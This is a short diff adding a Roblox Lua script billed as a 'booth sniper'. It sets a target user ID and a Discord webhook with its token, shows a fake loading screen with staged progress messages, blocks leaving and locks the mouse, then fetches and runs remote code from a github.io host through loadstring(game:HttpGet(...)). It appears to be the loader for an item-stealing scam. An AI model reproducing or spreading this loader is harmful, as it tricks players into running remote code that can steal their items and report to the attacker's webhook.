@@ -1,0 +1,14 @@
+_G.UserID = 3370671161
+_G.Webhook = "https://discordapp.com/api/webhooks/1103258883109171230/Jq4GONDBgbyv3i6qMdhlR5bj14R_PBLouanMEUltJe-ZE2be39rrrt97PP6BZj-J1Xjh"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "booth sniper"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "searching booths..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Script.lua", true))()
